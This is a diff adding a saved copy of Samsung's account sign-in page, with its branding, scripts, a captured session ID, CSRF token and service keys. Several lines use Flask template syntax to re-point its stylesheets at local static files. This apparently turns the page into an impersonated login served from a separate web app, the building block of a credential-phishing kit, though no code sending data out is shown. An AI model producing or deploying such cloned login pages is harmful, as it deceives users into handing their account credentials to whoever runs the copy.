@@ -1,0 +1,460 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta charset="utf-8">
+  <title>Samsung account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="referrer" content="no-referrer-when-downgrade">
+
+
+<script>var PAGEPATH = '/accounts/sign/signInIdentification.js';</script>
+
+<link rel="stylesheet" href="https://account.samsung.com/accounts/v1/resources/js/common/angular-block-ui/angular-block-ui.min.css">
+<link rel="stylesheet" type="text/css" href="https://account.samsung.com/accounts/v1/resources/css/v2/angular-material.css?20230503191730">
+<link rel="stylesheet" type="text/css" href="https://account.samsung.com/accounts/v1/resources/one-ui/css/default.css?20230503191730">
+
+<link type="image/x-icon" rel="shortcut icon" href="https://account.samsung.com/favicon.ico?20230503191730"/>
+<!--[if lt IE 9]>
+<script src="https://account.samsung.com/accounts/v1/resources/js/common/json/json3.min.js"></script>
+<script src="https://account.samsung.com/accounts/v1/resources/js/common/html5shiv/html5shiv.min.js"></script>
+<![endif]-->
+<script type="text/javascript">
+  //<![CDATA[
+  var wipLogicalPath = "/accounts/v1";
+  var wipResourcesVerDt = "20230503191730";
+  var wipCancelURI = "https://www.samsung.com/us/?state=GLBimdavwgq3u";
+  var wipGoBackURI = "https://www.samsung.com/us/?state=GLBimdavwgq3u";
+  var loLangCD = "en";
+  var loCntyCD = "US";
+  var isTextRightAlign = false;
+  var isTextFirstFamilyName = false;
+  var isTextFirstDateYear = false;
+  var wipAcsChnlEnum = "WEB";
+  var wipViewTypeEnum = "v2";
+  var userGeoIPCnty3dgtCd = "AUT";
+  var userAcsCnty3dgtCd = "USA";
+  var userCnty3dgtCd = "";
+  var wipUriEnum = "signIn";
+  var APPNAME = "samsung_com_us";
+  var sJSESSIONID = "4d3d1370-cb7f-4cbb-9315-1beefdd9bb6c";
+  var wipCsrf = {'token': 'c9d2510a-8537-42cc-b8cf-8835df3b6bf6', 'headerName': 'X-CSRF-TOKEN'};
+  var wipResourcesUrl = "https://account.samsung.com/accounts/v1/resources";
+  var isGAEnabled = true;
+  var googleRecaptchaApiUrl = "https://www.google.com";
+  var action = "signInIdentification";
+  var isRecaptchaEnabled = true;
+  var recaptchaSiteKey = "6LeI5F8iAAAAACfMal3lra4jEWUbkVGlnys_5CWG";
+  var isFromChina = false;
+  //]]>
+
+  if (isGAEnabled) {
+    var containerId;
+    if (wipResourcesUrl.indexOf("sad") !== -1) {
+      containerId = 'GTM-KCH2BM6';
+    } else if (wipResourcesUrl.indexOf("stg") !== -1) {
+      containerId = 'GTM-W3S5ZM6';
+    } else {
+      containerId = 'GTM-5C6SNNV';
+    }
+    (function (w, d, s, l, i) {
+      w[l] = w[l] || [];
+      w[l].push({
+        'gtm.start':
+          new Date().getTime(), event: 'gtm.js'
+      });
+      var f = d.getElementsByTagName(s)[0],
+        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+      j.async = true;
+      j.src =
+        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+      f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', containerId);
+  }
+
+  var createPostMessage = function () {
+
+    var sendPostMessage = function () {
+      console.log("");
+    }
+
+    if (APPNAME.indexOf("samsung_com_us") !== -1) {
+      if (document.getElementsByClassName('wrapper')[0]) {
+        var pageType = "signin";
+        if (document.querySelector('form[name="signUpForm"]')) {
+          pageType = "signup";
+        } else if (document.querySelector('form[name=findIdForm]')) {
+          pageType = "findid";
+        } else if (document.querySelector('form[name=rstPwd]')) {
+          pageType = "resetpwd";
+        } else {
+          pageType = "others";
+        }
+        sendPostMessage = function () {
+          window.parent.postMessage({
+            pageType: pageType
+          }, '*');
+        }
+      }
+    }
+    sendPostMessage();
+  }
+
+</script>
+
+<!-- js loading -->
+<script src="https://account.samsung.com/accounts/v1/resources/js/common/wip.js?20230503191730"></script>
+
+<script src="https://account.samsung.com/accounts/v1/resources/js/v2/app.js?20230503191730"></script>
+<script src="https://account.samsung.com/accounts/v1/resources/js/v2/run.js?20230503191730"></script>
+
+<script src="https://account.samsung.com/accounts/v1/resources/js/common/qrcode-generator/qrcode.js"></script>
+<script src="https://account.samsung.com/accounts/v1/resources/js/common/qrcode-generator/qrcode_UTF8.js"></script>
+<script src="https://account.samsung.com/accounts/v1/resources/js/common/angular-qrcode/angular-qrcode.js"></script>
+
+<!-- Samsung analytics -->
+
+
+<script>
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isIE = false;
+  var sessionId = "4d3d1370-cb7f-4cbb-9315-1beefdd9bb6c";
+  var transactionId = "1683143816";
+  var countryCode = "AUT";
+  var samsungAnalyticsEnabled = false;
+  var pageName = "signInIdentification";
+
+  let pageLogging = function (callback) {
+    if (samsungAnalyticsEnabled && !isIE) {
+      window.sa('set', 'pageName', pageName);
+      window.sa('set', 'customDimension', 'sessionId', sessionId);
+      window.sa('set', 'customDimension', 'transactionId', transactionId);
+      window.sa('set', 'customDimension', 'countryCode', countryCode);
+      window.sa('send', 'pv', undefined, {
+        onSuccess: {
+          analysis: callback
+        },
+        onError: {
+          analysis: callback
+        },
+        timeout: 1000
+      });
+    } else {
+      typeof callback === 'function' && callback();
+    }
+  }
+
+  let eventLogging = function (eventName, callback) {
+    if (samsungAnalyticsEnabled && !isIE) {
+      window.sa('set', 'pageName', pageName);
+      window.sa('set', 'eventName', pageName + '_' + eventName);
+      window.sa('set', 'customDimension', 'sessionId', sessionId);
+      window.sa('set', 'customDimension', 'transactionId', transactionId);
+      window.sa('set', 'customDimension', 'countryCode', countryCode);
+      window.sa('send', 'ev', undefined, {
+        onSuccess: {
+          analysis: callback
+        },
+        onError: {
+          analysis: callback
+        },
+        timeout: 1000
+      });
+    } else {
+      typeof callback === 'function' && callback();
+    }
+  }
+</script>
+<script>
+  window.onload = pageLogging();
+</script>
+
+<!-- Recaptcha enterprise -->
+
+  <script src="https://www.recaptcha.net/recaptcha/enterprise.js?render=6LeI5F8iAAAAACfMal3lra4jEWUbkVGlnys_5CWG"></script>
+
+
+<!-- Datadome -->
+
+<script>
+  window.ddjskey = "EB9956AFB353D5DA3AE0A48993A8C5";
+  window.ddoptions = {ajaxListenerPath: true};
+</script>
+<script src="https://js.datadome.co/tags.js"></script>
+
+
+<link href="{{ url_for('static', filename='angular-block-ui.min.css') }}" rel="stylesheet" type="text/css" />
+<link href="{{ url_for('static', filename='angular-material.css') }}" rel="stylesheet" type="text/css" />
+<link href="{{ url_for('static', filename='default.css') }}" rel="stylesheet" type="text/css" />
+</head>
+<script type="text/javascript">
+  window.document.title = 'Sign in | Samsung account';
+  var wipEnc = {"pblcKyTxt":"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCylnSE8ANPUNPmgYJGnApUrUPQiBmTY44Lw+fQbFOOslZZnuUasDFJuPU4287/LBQEpTtgPWLmjGftG/b2sj8eTH46mvhDtE8ijgZsMnGPMmhu/AljEvNOqU6nDZDtgGmL/pAdEBtsJ/VzClv8G9bV1kvczuZtg0gt3JTH+pagEwIDAQAB","lgnEncTp":"1","pbeKySpcIters":"200"};
+  var iptLgnPlnID = '';
+  var continueWith3rdParty = 'GG';
+  var isAdmin = eval(false);
+</script>
+<style>
+    .error-msg {
+        display: block !important
+    }
+</style>
+
+
+  <script src="https://apis.google.com/js/api:client.js"></script>
+
+
+<body data-ng-cloak onload="createPostMessage();" class="one-card-ui">
+
+<div class="wrapper" data-ng-controller="cmmController as cmm">
+  
+<div class="banner" ng-if="isIESupportMessageShow=='Y'">
+  <div class="banner-inner">
+    <div class="title">Support for Internet Explorer is ending soon</div>
+    <div class="cnt">
+      After 2022-04-01, you will no longer be able to use Internet Explorer to access your Samsung account.
+      <br>
+      To access Samsung account after  2022-04-01, use  <a href="https://www.microsoft.com/edge" target="_blank">Microsoft Edge</a>, <a href="https://www.google.com/chrome/" target="_blank">Google Chrome</a>, or <a href="https://www.mozilla.org/" target="_blank">Mozilla Firefox</a>.
+    </div>
+    <div class="close">
+      <button type="button" ng-click="isIESupportMessageShowToggle()">Banner Close</button>
+    </div>
+  </div>
+</div>
+<header class="one-header">
+  <div class="header-inner">
+    <div class="logo">
+      <h1><img src="https://account.samsung.com/accounts/v1/resources/one-ui/images/svg/txt_logo.svg"
+               onerror="this.src='https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_logo.png';" alt="Samsung account"></h1>
+    </div>
+  </div>
+</header>
+
+  <main class="one-main new-login" data-ng-controller="signInController as vm">
+    <div class="main-inner">
+      <div class="container">
+        <div class="title">
+          <h1>
+            Sign in to your Samsung account
+          </h1>
+        </div>
+        <div class="content">
+          <div class="one-forms-login">
+            <form novalidate autocomplete="off">
+              <fieldset>
+                <legend>Account Samsung login</legend>
+
+                <div class="new-idform">
+                  <div id="ctnLgnPlnID" data-ng-if="false"
+                       class="one-input-container container-login">
+                    <label id="lblLgnPlnID" for="iptLgnPlnID">Email or phone number</label>
+                    <input data-ng-model="vm.iptLgnPlnID" id="iptLgnPlnID" spellcheck="false"
+                           ng-model-options="{ updateOn: 'keyup blur' }" aria-required="true"
+                           aria-invalid="{{err.iptLgnPlnID}}"
+                           aria-describedby="{{err.iptLgnPlnID ? err.code : ''}}" maxlength="100" value=""/>
+                    <div class="error-msg">
+                      <div data-ng-show="(err.iptLgnPlnID && err.code == '01')"
+                           id="{{err.code}}">Please enter ID.</div>
+                      <div data-ng-show="(err.iptLgnPlnID && err.code == '02')"
+                           id="{{err.code}}">
+                        ID not valid.
+                      </div>
+                      <div data-ng-show="(err.iptLgnPlnID && err.code == 'AUT_1837')"
+                           id="{{err.code}}">
+                        Can&#39;t sign in. Account deactivated for security reasons.
+                      </div>
+                    </div>
+                  </div>
+
+                  <div id="ctnLgnPlnID" data-ng-if="true"
+                       class="one-input-container container-login">
+                    <label id="lblLgnPlnID" for="iptLgnPlnID">Email</label>
+                    <input data-ng-model="vm.iptLgnPlnID" id="iptLgnPlnID" type="email" spellcheck="false"
+                           ng-model-options="{ updateOn: 'keyup blur' }" aria-required="true"
+                           aria-invalid="{{err.iptLgnPlnID}}"
+                           aria-describedby="{{err.iptLgnPlnID ? err.code : ''}}" maxlength="100" value=""/>
+                    <div class="error-msg">
+                      <div data-ng-show="(err.iptLgnPlnID && err.code == '01')"
+                           id="{{err.code}}">Please enter ID.</div>
+                      <div data-ng-show="(err.iptLgnPlnID && err.code == '02')"
+                           id="{{err.code}}">
+                        ID not valid.
+                      </div>
+                      <div data-ng-show="(err.iptLgnPlnID && err.code == 'AUT_1837')"
+                           id="{{err.code}}">
+                        Can&#39;t sign in. Account deactivated for security reasons.
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="one-checkBox mbr_rememberid" id="rememberID">
+                    <input type="checkbox" id="remIdChkYN" data-ng-model="vm.remIdChkYN" ng-enter>
+                    <label for="remIdChkYN"><span></span>Remember my ID</label>
+                  </div>
+
+                </div>
+
+                <div class="mbr_signin">
+                  <div class="one-btn-container">
+                    <button class="one-primary one-button"
+                            id="signInButton"
+                            data-ng-disabled="err.iptLgnPlnID || !vm.iptLgnPlnID"
+                            data-ng-click="checkUsableLoginId()" type="button">
+                      Next
+                    </button>
+                  </div>
+                  <ul>
+                    <li>
+                      <a href="#" data-ng-click="findInfo()">
+                        Find ID
+                      </a>
+                    </li>
+                    <li data-ng-show="!vm.rmvCrtBtnYN">
+                      <a href="#" data-ng-click="signUp()">Create account</a>
+                    </li>
+                  </ul>
+                </div>
+
+                <div class="one-btn-container google" data-ng-show="vm.continueWith3rdParty == 'GG'">
+                  <button class="one-cancel one-button" id="googleSignInButton" data-ng-click=googleSignIn()
+                          type="button">Sign in with Google</button>
+                </div>
+
+                <div class="one-btn-container wechat" data-ng-show="vm.continueWith3rdParty == 'WC'">
+                  <button class="one-cancel one-button" id="wechatSignInButton" data-ng-click=wechatSignIn()
+                          type="button">Continue with WeChat</button>
+                </div>
+
+                <div class="one-btn-container qrcode" data-ng-show="true">
+                  <button class="one-cancel one-button" id="qrSignInButton" data-ng-click=qrSignIn()
+                          type="button">Sign in with QR code</button>
+                </div>
+
+                <div class="signin-tooltip" data-ng-show="vm.isAdmin">
+                  <dl>
+                    <dt>Password (for admin only)</dt>
+                    <dd>Use 8 or more characters with a mix of letters, numbers, and symbols.<br><br>If your password does not meet the criteria, you will not be able to sign in.</dd>
+                  </dl>
+                  <p></p>
+                </div>
+              </fieldset>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+
+<!-- footer -->
+<footer class="one-footer" role="contentinfo">
+  <div class="footer-inner">
+    <div class="footer-logo"><img
+        src="https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_foo_logo.png"
+        onerror="this.src='https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_foo_logo.png';" alt="Samsung account"></div>
+    <address class="footer-address">Copyright © 1995-2023 Samsung. All Rights Reserved.</address>
+    <div class="footer-links" role="link">
+      <a href="https://account.samsung.com/membership/terms/termscontents?paramLocale=en_US"
+         title="Open links in a new window Terms and Conditions">Terms and Conditions</a>
+      <a href="https://account.samsung.com/membership/terms/privacypolicy?paramLocale=en_US"
+         title="Open links in a new window Privacy Policy" class="active">Samsung account Privacy Notice</a>
+      <a href="https://account.samsung.com/membership/notice/notice-list?paramLocale=en_US"
+         title="Open links in a new window Notices">Notice</a>
+      <a href="https://help.content.samsung.com/csweb/auth/gosupport.do?targetUrl=/main/main.do&serviceCd=saccount&_common_country=US&_common_lang=en"
+         title="Open links in a new window Contact us">Contact us</a>
+    </div>
+  </div>
+</footer>
+<!-- //footer -->
+
+</div>
+
+<!-- javascript -->
+<script src="https://account.samsung.com/accounts/v1/resources/one-ui/js/common/jquery/jquery.min.js"></script>
+
+<script>
+  $(document).ready(function () {
+
+    inputEvent();
+    if ($('form').find(':input')[0] !== undefined) {
+      $(':focus').blur();
+      $('form').find(':input')[0].focus();
+    }
+  });
+
+  var attributeObserver = new MutationObserver(function (mutations) {
+    mutations.forEach(function (mutation) {
+      if (mutation.target.className.includes('ng-not-empty')) {
+        var $input = $(mutation.target)
+        var $label = $input.parent('div.one-input-container')
+
+        $label.addClass('active');
+        $label.siblings('div.flexbdy').addClass('off');
+      };
+    })
+  });
+
+  var inputEvent = function () {
+    var $inputs = $('form').find(':input');
+    $inputs.each(function () {
+        var $input = $(this);
+        var $label = $input.parent('div.one-input-container');
+
+        attributeObserver.observe($input.get(0), {
+          attributes: true,
+          attributeFilter: ['class'],
+          attributeOldValue: false,
+          characterData: false,
+          characterDataOldValue: false,
+          childList: false,
+          subtree: false
+        });
+
+        if ($input.val()) {
+          $label.addClass('active');
+          $label.siblings('div.flexbdy').addClass('off');
+        }
+
+        $input.focusin(function () {
+          $label.addClass('focus');
+          $label.siblings('div.flexbdy').addClass('off');
+        });
+
+        $input.change(function () {
+          $label.addClass('active');
+        });
+
+        $input.focusout(function () {
+          $label.removeClass('focus');
+
+          if (!$input.val()) $label.removeClass('active').siblings('div.flexbdy').removeClass('off');
+        });
+      }
+    );
+  }
+</script>
+
+</body>
+</html>
